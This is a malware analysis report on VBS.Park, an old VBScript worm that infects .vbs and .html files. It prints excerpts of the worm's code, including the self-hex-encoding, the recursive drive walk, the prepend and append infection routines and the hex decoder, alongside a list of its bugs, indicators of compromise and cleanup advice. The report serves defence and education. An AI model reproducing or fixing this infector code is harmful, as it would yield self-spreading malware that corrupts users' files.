# 🛡️ Malware Analysis Report: VBS.Park

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-VBScript%20%2B%20HTML%20file%20infector-red)
![Creation Date](https://img.shields.io/badge/created-2002--06--24-orange)

## Overview

VBS.Park is a VBScript file infector that self-encodes into hex and attempts to infect both .vbs and .htm/.html files on local and removable drives. Its strategy is to:
- Read its own script and build a hex-encoded string variable (`virhex`).
- Recursively traverse fixed and removable drives.
- For VBS files: prepend a small loader that decodes `virhex` and then append the original VBS content.
- For HTML files: append a `<SCRIPT LANGUAGE=VBScript>` block that embeds `virhex`, defines a local infection routine, and re-writes the page content.

The sample contains multiple implementation bugs that significantly reduce or break infection in practice (see "Bugs and oddities").

> Historical malware analysis for education. Do not execute outside an isolated, lawful malware lab.

## Execution flow

1) Self-hexification (build `virhex`)

```vb
' Marker in original file header
'VBS.Park

Set fs = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")

' BUG: uses fs0 instead of fs
Set fl = fs0.OpenTextFile(WScript.ScriptFullName, 1)
virus = fl.ReadAll: fl.Close

f = "virhex="""
For i = 1 To Len(virus)
  e = Mid(virus, i, 1)
  e = Hex(Asc(e))
  If Len(e) = 1 Then e = "0" & e
  f = f & e
Next
f = f & """"
```

2) Drive traversal

```vb
For Each drv In fs.Drives
  If drv.DriveType = 2 Or drv.DriveType = 3 Then ' 2=Removable, 3=Fixed
    list drv.Path & "\"
  End If
Next
```

3) Recursive directory walk and infection

```vb
Sub list(dir)
  For Each ssf In fs.GetFolder(dir).SubFolders
    infect ssf.Path
    list ssf.Path
  Next
End Sub

Sub infect(dir)
  For Each fil In fs.GetFolder(dir).Files
    ext = LCase(fs.GetExtensionName(fil.Path))

    If ext = "vbs" Then
      ' BUGs: uses Q.Path; missing read() function in main script
      Set vb = fs.OpenTextFile(Q.Path, 1)
      If vb.ReadLine <> "'VBS.Park"" Then
        vbsorg = vb.ReadAll()
        vb.Close
        Set vb = fs.OpenTextFile(Q.Path, 2)
        vb.WriteLine read(virhex)
        vb.WriteLine vbsorg
        vb.Close
      Else
        vb.Close
      End If

    ElseIf ext = "htm" Or ext = "html" Then
      ' BUGs: uses P.Path; later uses fso vs fs
      Set ht = fs.OpenTextFile(P.Path, 1)
      htmf = ht.ReadAll: ht.Close
      If InStr(1, htmf, "virhex", 1) = 0 Then
        Set ht = fs.OpenTextFile(P.Path, 8)
        ' ... appends a VBScript block (see next section)
      End If
    End If
  Next
End Sub
```

## HTML infection payload (appended to .htm/.html)

If an HTML page doesn’t already contain `virhex`, the worm appends a VBScript block that:
- Defines `virhex` with the current worm’s hex string (using previously built `f`).
- Calls `Infect` on several locations: Windows special folders (0,1,2), `C:\`, `MyDocuments`, `Desktop`, `Favorites`.
- Provides a local `Infect(dir)` that:
  - For VBS files: prepends `read(virhex)` + original.
  - For HTML files: writes a marker line `<vbshtmpark>` and then re-writes the page contents plus `document.body.CreateTextRange.htmltext`.
- Implements a `read(octet)` routine that converts the hex back to bytes.

Excerpt (as emitted into HTML):

```html
<SCRIPT LANGUAGE=VBScript>
Set fs=CreateObject("Scripting.FileSystemObject")
Set ws=CreateObject("WScript.Shell")
virhex="...hex of worm..."
Infect(fso.GetSpecialFolder(0))
Infect(fso.GetSpecialFolder(1))
Infect(fso.GetSpecialFolder(2))
Infect("C:\")
Infect(ws.SpecialFolders("MyDocuments"))
Infect(ws.SpecialFolders("Desktop"))
Infect(ws.SpecialFolders("Favorites"))
Sub Infect(dir)
  For each Q in fs.GetFolder(dir).Files
    ext = LCase(fs.GetExtensionName(Q.Name))
    ' vbs infection (prepend)
    ' html infection (guarded by <vbshtmpark> marker on first line)
  Next
End Sub
Function read(octet)
  For hexa=1 To Len(octet) Step 2
    read = read & Chr("&h" & Mid(octet, hexa, 2))
  Next
End Function
</SCRIPT>
```

Notes:
- The HTML payload uses `fso` but only defines `fs` (variable mismatch).
- The marker `<vbshtmpark>` is used to avoid re-infecting HTML pages.

## Bugs and oddities (reduce real-world spread)

- fs0 vs fs: `Set fl=fs0.OpenTextFile(...)` will throw; masked by `On Error Resume Next` and may stop self-hexification.
- Q/P variable misuse: VBS and HTML infection use `Q.Path` / `P.Path` while the active variables are `fil` or local `Q`; the outer VBS branch references `Q` without defining it.
- Missing `read()` in the main script: VBS infection writes `read(virhex)` but no `Function read(...)` exists in the base script; only the HTML payload defines it.
- Reinfection guard likely broken: check `If vb.ReadLine <> "'VBS.Park"" Then` is malformed and, even when working, infected files will start with `read(virhex)` rather than `'VBS.Park`, causing repeated growth.
- fso vs fs: The HTML block calls `Infect(fso.GetSpecialFolder(...))` though only `fs` is created.
- Heavy reliance on `On Error Resume Next`: hides runtime errors, often resulting in no-op behavior rather than clean infection.

## Indicators of Compromise (IoCs)

Files/content markers:
- HTML:
  - First line equals `<vbshtmpark>` (inserted by the payload before original contents).
  - Appended `<SCRIPT LANGUAGE=VBScript>` block containing a `virhex` definition and a `Function read(octet)` that hex-decodes bytes.
- VBS:
  - Presence of a leading line like `read(virhex)` followed by the original script body (may be duplicated repeatedly due to broken guard).
  - Original marker in the source sample: a header comment `'VBS.Park`.

Behavior:
- Recursive enumeration of fixed and removable drives.
- Attempts to write into Windows SpecialFolders (0/1/2) and user folders (Desktop, MyDocuments, Favorites).

## Mitigation and cleanup

- Search and remove the appended HTML VBScript blocks; restore clean HTML from backups. Detect by `<vbshtmpark>` on the first line or presence of `virhex` and `Function read(octet)`.
- For VBS files, strip leading `read(virhex)` stubs and de-duplicate if the file has been repeatedly prepended; prefer restoring known-good copies.
- Disable Windows Script Host for regular users when not required; constrain VBScript execution in browsers (legacy IE) via Group Policy.
- Apply least-privilege policies to prevent scripts from writing to system and user profile directories.
- Use endpoint protection capable of detecting script-based file infectors and local machine zone VBScript execution in HTML files.

## Notes

- Designed to mix classic VBS file infection with HTML VBScript payloads that run in the Local Machine zone of legacy IE.
- Due to the number of bugs, many copies will fail to propagate reliably; however, partially infected files and HTML script blocks can still pose risk.

— Analysis based on `Park.vbs`, June 24, 2002.
